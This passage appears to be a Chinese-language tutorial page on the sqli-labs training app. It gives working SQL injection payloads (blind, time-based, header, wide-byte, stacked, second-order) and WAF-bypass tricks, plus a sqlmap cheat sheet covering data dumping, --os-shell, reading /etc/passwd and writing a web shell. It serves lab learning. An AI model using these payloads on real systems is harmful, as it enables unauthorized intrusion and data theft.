+1'</span><span class="p">))</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">105</span> <span class="c1">--+</span>
+
+<span class="c1">-- 获取数据（结果：1: Dumb:Dumb）</span>
+<span class="mi">1</span><span class="s1">')) and ascii(substr((select username from users limit 0,1),1,1))=68--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-9--时间盲注">sqli-labs Less-9 – 时间盲注</h4>
+
+<p>其实就是布尔盲注外面套了个<code class="language-plaintext highlighter-rouge">if(xxx, sleep, 1)</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>http://localhost/sqli-labs/Less-1/?id=9  → 无回显位置
+http://localhost/sqli-labs/Less-1/?id=9' → 无页面报错
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>什么反应都没有，试试时间盲注。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://localhost/sqli-labs/Less-1/?id=1' and sleep(5) --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>画面明显停顿5秒。存在sql时间盲注漏洞。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td><td class="rouge-code"><pre><span class="mi">1</span><span class="s1">' and if(1=1,sleep(5),1)--+
+-- 判断参数构造。
+1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">9</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="c1">-- 判断数据库名长度</span>
+
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+-- 逐一判断数据库字符
+1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">13</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="c1">-- 判断所有表名长度</span>
+
+<span class="mi">1</span><span class="s1">'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+-- 一判断表名
+1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">and</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">20</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="c1">-- 判断所有字段名的长度</span>
+
+<span class="mi">1</span><span class="s1">'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="n">users</span><span class="s1">'),1,1))&gt;99,sleep(5),1)--+
+-- 逐一判断字段名。
+1'</span> <span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">109</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="c1">-- 判断字段内容长度</span>
+
+<span class="mi">1</span><span class="s1">' and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+-- 逐一检测内容。
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-11--post注入">sqli-labs Less-11 – POST注入</h4>
+
+<p>通常是绕过登录。先在 username 这里输入 <code class="language-plaintext highlighter-rouge">admin'#</code> 加注入语句，或者是password输入 <code class="language-plaintext highlighter-rouge">1'#</code> 注入，嫌测试麻烦就两者都注入。然后其他的注入方式都是一样的。</p>
+
+<h4 id="sqli-labs-less-18--http头注入">sqli-labs Less-18 – HTTP头注入</h4>
+
+<p>HTTP头注入比GET/POST参数注入<strong>更难发现</strong>，因为<strong>浏览器不直接展示这些输入点且需要登录态</strong>。</p>
+
+<p>对于这种浏览器测试很麻烦的HTTP头注入就需要第三方代理——burpsuite拦截手注了。</p>
+
+<p>HTTP头注入点：<code class="language-plaintext highlighter-rouge">Cookie</code>、<code class="language-plaintext highlighter-rouge">User-Agent</code>、<code class="language-plaintext highlighter-rouge">Referer</code>、<code class="language-plaintext highlighter-rouge">X-Forwarded-For</code>、<code class="language-plaintext highlighter-rouge">Host</code>、<code class="language-plaintext highlighter-rouge">Authorization</code></p>
+
+<p>发现方法</p>
+
+<p>1. 能看见源码的情况下是能看见所有漏洞的。</p>
+
+<p>2. 用Burp抓包，然后在目标Header后加单引号<code class="language-plaintext highlighter-rouge">'</code>（最快），或者用万能的时间盲注检测。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1</span>
+<span class="s">...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">' AND SLEEP(5) AND ''='</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">id=1 AND SLEEP(5)</span>
+<span class="na">X-Forwarded-For</span><span class="p">:</span> <span class="s">127.0.0.1' AND SLEEP(5) AND ''='</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>3. sqlmap自动检测</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c"># 级别3开始扫Header</span>
+python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://localhost/sqli-labs/Less-18"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"id=1"</span> <span class="nt">--level</span><span class="o">=</span>3
+
+<span class="c"># 指定Header</span>
+python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://localhost/sqli-labs/Less-18"</span> <span class="nt">--headers</span><span class="o">=</span><span class="s2">"User-Agent: Mozilla/5.0"</span>
+
+<span class="c"># 从Burp请求文件自动识别</span>
+python sqlmap.py <span class="nt">-r</span> req.txt <span class="nt">--level</span><span class="o">=</span>3
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-21--参数加密">sqli-labs Less-21 – 参数加密</h4>
+
+<p>这种一般都是简单加密 + 非盲注的方式。否则需要 逆向解密 + 解密密钥 + 盲注脚本 + 加密算法脚本 这种的就已经不是单纯的web方向的题了。</p>
+
+<p>观察加密方式，然后手注 + 简单加密一点点注入就可以得到数据。</p>
+
+<h4 id="sqli-labs-less-23--过滤绕过">sqli-labs Less-23 – 过滤绕过</h4>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://localhost/sqli-labs/Less-23/?id=1' and '1'='1 -- 手动双向闭合
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">绕过场景</th>
+      <th style="text-align: left">方法</th>
+      <th style="text-align: left">示例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">过滤注释符</td>
+      <td style="text-align: left">手工闭合</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">' AND '1'='1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">过滤空格</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">/**/</code> 、 <code class="language-plaintext highlighter-rouge">%0a</code> 、 <code class="language-plaintext highlighter-rouge">%09</code> 、括号</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">union/**/select</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">过滤 <code class="language-plaintext highlighter-rouge">=</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">LIKE</code> 、 <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> 、 <code class="language-plaintext highlighter-rouge">IN</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">id&gt;1 AND id&lt;3</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">过滤引号</td>
+      <td style="text-align: left">十六进制编码</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">where username=0x61646d696e</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">过滤 <code class="language-plaintext highlighter-rouge">AND/OR</code></td>
+      <td style="text-align: left">符号替代 (<code class="language-plaintext highlighter-rouge">&amp;&amp;</code> <code class="language-plaintext highlighter-rouge">||</code>) 或双写</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">1 &amp;&amp; 1=1</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">逗号被过滤</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">JOIN</code> 替代 <code class="language-plaintext highlighter-rouge">UNION</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">union select * from ((select 1)A join (select 2)B)</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="sqli-labs-less-24--二次注入">sqli-labs Less-24 – 二次注入</h4>
+
+<p>存入恶意数据 → 数据库藏雷 → 调用时程序读出来拼SQL → 触发注入</p>
+
+<p>通常是注册/编辑/留言等写入操作时<strong>存进去，后面再调用时被拼接到SQL里</strong>（例如注册 <code class="language-plaintext highlighter-rouge">admin’ #</code>），改密码的时候炸（登录并改密码，此时改的是真正的 <code class="language-plaintext highlighter-rouge">admin</code>）</p>
+
+<p>查看数据库记录是否原样保存（不要转义），如果被转义就不能二次注入。</p>
+
+<p><strong>典型场景</strong>：注册用户名、文章标题、个人签名、收货地址、评论内容</p>
+
+<h4 id="sqli-labs-less-29--双服务器架构">sqli-labs Less-29 – 双服务器架构</h4>
+
+<p><strong>前端服务器（Tomcat/JSP）</strong>：充当WAF，只校验第一个参数，必须是数字。</p>
+
+<p><strong>后端服务器（Apache/PHP）</strong>：真正提供Web服务，处理最后一个参数。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://localhost/sqli-labs/Less-29/?id=1&amp;id=-1' union select 1,database(),3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-32--宽字节注入">sqli-labs Less-32 – 宽字节注入</h4>
+
+<p>查页面/响应头：<code class="language-plaintext highlighter-rouge">Content-Type: text/html; charset=gbk</code></p>
+
+<p>这就是宽字节注入。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://localhost/sqli-labs/Less-32/?id=-1%df' union select 1,database(),3 --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="sqli-labs-less-32--堆叠注入">sqli-labs Less-32 – 堆叠注入</h4>
+
+<p>堆叠注入就是可以执行多个语句的SQL注入，可以进行<strong>增删改查</strong>所有操作。常用于：改数据、删表、写文件、调用存储过程。</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="err">http://localhost/sqli-labs/Less-29/?id=-1';show tables;--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>但是由于回显位置有限，所以不能显示表。<strong>任何</strong>注入方式都可以<strong>任意</strong>查询。</p>
+
+<h4 id="sqlmap版">sqlmap版</h4>
+
+<p>一把梭Less-1（性能最佳版）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://localhost/sqli-labs/Less-1/?id=1"</span> <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--prefix</span><span class="o">=</span><span class="s2">"'"</span> <span class="nt">--suffix</span><span class="o">=</span><span class="s2">"--+"</span> <span class="nt">--batch</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>核心参数（每次都用）</strong></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">参数</th>
+      <th style="text-align: left">作用</th>
+      <th style="text-align: left">示例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-u</code></td>
+      <td style="text-align: left">目标URL</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">sqlmap -u "http://test.com/?id=1"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-r</code></td>
+      <td style="text-align: left">从HTTP请求文件读取</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">sqlmap -r req.txt</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--data</code></td>
+      <td style="text-align: left">POST请求数据</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--data="user=admin&amp;pass=123"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--cookie</code></td>
+      <td style="text-align: left">设置Cookie</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--cookie="id=1; token=abc"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p</code></td>
+      <td style="text-align: left">指定要测试的参数</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p "id,user"</code>（不测别的）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--skip</code></td>
+      <td style="text-align: left">忽略指定参数</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--skip=order,user</code>（不测试它）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">–regexp</td>
+      <td style="text-align: left">从响应中提取指定正则内容</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--regexp="&lt;title&gt;(.*?)&lt;/title&gt;"</code>（自定义数据提取）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--level</code></td>
+      <td style="text-align: left">测试级别（1-5，默认1）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--level=3</code>（测更多HTTP头）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--risk</code></td>
+      <td style="text-align: left">风险级别（1-3，默认1）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--risk=2</code>（允许更多破坏性测试）</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">参数</th>
+      <th style="text-align: left">作用</th>
+      <th style="text-align: left">适用场景</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--technique</code></td>
+      <td style="text-align: left">指定注入技术</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--technique=BEU</code>（只测布尔/报错/联合）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--prefix</code></td>
+      <td style="text-align: left">闭合前缀</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--prefix="')"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--suffix</code></td>
+      <td style="text-align: left">闭合后缀</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--suffix="-- -"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--tamper</code></td>
+      <td style="text-align: left">使用绕过脚本</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--tamper=space2comment</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">--technique</code> 可选值：</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">字符</th>
+      <th style="text-align: left">含义</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">B</code></td>
+      <td style="text-align: left">布尔盲注</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">E</code></td>
+      <td style="text-align: left">报错注入</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">U</code></td>
+      <td style="text-align: left">联合查询</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">S</code></td>
+      <td style="text-align: left">堆叠查询</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">T</code></td>
+      <td style="text-align: left">时间盲注</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>获取的信息数据</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">参数</th>
+      <th style="text-align: left">作用</th>
+      <th style="text-align: left">示例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--dbs</code></td>
+      <td style="text-align: left">列出所有数据库</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">sqlmap -u "url" --dbs</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-D</code></td>
+      <td style="text-align: left">指定数据库</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-D security</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--tables</code></td>
+      <td style="text-align: left">列出表</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-D security --tables</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-T</code></td>
+      <td style="text-align: left">指定表</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-T users</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--columns</code></td>
+      <td style="text-align: left">列出列</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-T users --columns</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--dump</code></td>
+      <td style="text-align: left">导出数据</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">-T users --dump</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--dump-all</code></td>
+      <td style="text-align: left">导出全部</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--dump-all --exclude-sysdbs</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--batch</code></td>
+      <td style="text-align: left">自动选默认选项</td>
+      <td style="text-align: left">跑脚本时用，避免交互</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>性能与隐匿</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">参数</th>
+      <th style="text-align: left">作用</th>
+      <th style="text-align: left">示例</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--threads</code></td>
+      <td style="text-align: left">并发线程（默认1）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--threads=10</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--delay</code></td>
+      <td style="text-align: left">每次请求延迟（秒）</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--delay=2</code>（避开WAF）</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--time-sec</code></td>
+      <td style="text-align: left">时间盲注等待秒数</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--time-sec=5</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--random-agent</code></td>
+      <td style="text-align: left">随机User-Agent</td>
+      <td style="text-align: left">绕过简单UA检测</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--proxy</code></td>
+      <td style="text-align: left">设置代理</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--proxy="http://127.0.0.1:8080"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--flush-session</code></td>
+      <td style="text-align: left">清空缓存</td>
+      <td style="text-align: left">改参数后重新测</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--fresh-queries</code></td>
+      <td style="text-align: left">不使用缓存结果</td>
+      <td style="text-align: left">强制重发请求</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>tamper脚本（绕过WAF）</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">tamper</th>
+      <th style="text-align: left">作用</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">space2comment</code></td>
+      <td style="text-align: left">空格替换成 <code class="language-plaintext highlighter-rouge">/**/</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">space2plus</code></td>
+      <td style="text-align: left">空格替换成 <code class="language-plaintext highlighter-rouge">+</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">unionalltounion</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">UNION ALL SELECT</code> → <code class="language-plaintext highlighter-rouge">UNION SELECT</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">charencode</code></td>
+      <td style="text-align: left">URL编码</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">charunicodeencode</code></td>
+      <td style="text-align: left">Unicode编码</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">between</code></td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">&gt;</code> 替换成 <code class="language-plaintext highlighter-rouge">BETWEEN</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">modsecurityversioned</code></td>
+      <td style="text-align: left">用MySQL版本注释绕过</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">randomcase</code></td>
+      <td style="text-align: left">随机大小写</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>文件操作 ⚠️</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">参数</th>
+      <th style="text-align: left">作用</th>
+      <th style="text-align: left">条件</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--os-shell</code></td>
+      <td style="text-align: left">获取系统shell</td>
+      <td style="text-align: left">MySQL需写权限</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--os-cmd</code></td>
+      <td style="text-align: left">执行单条命令</td>
+      <td style="text-align: left">同上</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-read</code></td>
+      <td style="text-align: left">读取服务器文件</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-read="/etc/passwd"</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-write</code></td>
+      <td style="text-align: left">写入本地文件</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-write shell.php</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-dest</code></td>
+      <td style="text-align: left">远程写入路径</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">--file-dest="/var/www/html/shell.php"</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>基础检测（未定任何参数，最慢）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://test.com/?id=1"</span> <span class="nt">--batch</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>POST注入</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://test.com/login.php"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"user=1&amp;pass=1"</span> <span class="nt">--batch</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Cookie注入</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://test.com/user.php"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"id=1"</span> <span class="nt">--level</span><span class="o">=</span>3
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>绕WAF（tamper脚本）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-u</span> <span class="s2">"http://test.com/?id=1"</span> <span class="nt">--tamper</span><span class="o">=</span>space2comment,charencode
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>从Burp请求文件跑（burp生成的post_login.txt文件）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python sqlmap.py <span class="nt">-r</span> post_login.txt <span class="nt">--batch</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>不写参数为默认参数，如果想要效率就把参数填全了。尤其是盲注，手注时找到敏感参数然后加入绕过参数以提高效率。</p>
+
+<p>以下情况用sqlmap跑很难，建议自己写脚本。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">场景</th>
+      <th style="text-align: left">原因</th>
+      <th style="text-align: left">解决方案</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">复杂闭合</td>
+      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">') OR ('</code> 等嵌套</td>
+      <td style="text-align: left">手工确认闭合，用 <code class="language-plaintext highlighter-rouge">--prefix</code> 和 <code class="language-plaintext highlighter-rouge">--suffix</code></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">WAF 拦截</td>
+      <td style="text-align: left">特征被识别</td>
